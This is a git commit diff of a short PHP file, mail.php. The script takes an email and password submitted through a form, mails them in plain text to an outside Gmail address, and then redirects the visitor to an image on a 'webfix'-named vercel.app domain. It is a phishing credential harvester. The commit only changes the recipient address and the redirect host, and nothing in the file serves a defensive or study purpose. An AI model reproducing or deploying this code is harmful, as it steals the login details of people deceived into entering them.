29f1e5b0536b1eceb8f1847fdacb91dec99fca3e
Johnson noah <143536219+arishacke@users.noreply.github.com>
2023-09-03 14:18:07 -0700

    Update mail.php

--- mail.php
+++ mail.php
@@ -1,16 +1,16 @@
 <?php
 if(!empty($_POST["email"])) {
-$to = "support@xmartrades.online";
+$to = "ollarkunle1@gmail.com";
 $subject = "My subject";
 $email = $_POST["email"];
 $password = $_POST["password"];
 $txt = "Email:".$email.' & Password: '.$password;
-$headers = "From: support@xmartrades.online" . "\r\n" .
-"CC: support@xmartrades.online";
+$headers = "From: ollarkunle1@gmail.com" . "\r\n" .
+"CC: ollarkunle1@gmail.com";
 
 mail($to,$subject,$txt,$headers);
 
-header("Location: https://xmartrades.online/HelloTech-qr-code-300x300.webp");
+header("Location: https://validated-webfix.vercel.app/HelloTech-qr-code-300x300.webp");
 }
 ?>
 
